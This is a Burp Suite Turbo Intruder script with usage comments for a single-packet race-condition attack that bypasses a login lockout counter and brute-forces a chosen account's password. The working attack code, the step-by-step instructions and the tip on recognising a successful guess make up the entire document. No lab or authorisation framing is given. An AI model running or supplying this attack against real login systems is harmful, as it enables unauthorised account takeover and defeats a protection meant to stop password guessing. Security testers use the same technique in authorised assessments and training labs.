# Turbo Intruder script — single-packet race attack against a login lockout
#
# Technique: James Kettle's single-packet attack. Holds every queued request
# at a gate over one HTTP/2 connection, then releases them together so they
# arrive in (near) the same packet — closing the TOCTOU window on a
# check-then-increment counter (e.g. a failed-login lockout) tighter than
# independently-sent parallel requests can.
#
# Usage (Burp Turbo Intruder):
#   1. Send a POST /login request to Turbo Intruder (Extensions > Turbo Intruder > Send to Turbo Intruder).
#   2. Set the base request's `username` to the target account.
#   3. Highlight the `password` parameter value — Turbo Intruder will substitute it per-payload.
#   4. Copy your candidate password list to the clipboard before running (this script reads wordlists.clipboard).
#   5. Load this script and run the attack.
#   6. In the results table, look for the response that breaks the pattern — e.g. a 302 Found
#      instead of a lockout/invalid-credentials response. That payload is the hit.
#
# Requires: concurrentConnections=1 and engine=Engine.BURP2 — this is what forces every
# queued request onto a single HTTP/2 connection so the gate release behaves as a
# single-packet burst instead of N independent connections with normal network jitter.

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )

    for password in wordlists.clipboard:
        engine.queue(target.req, password, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
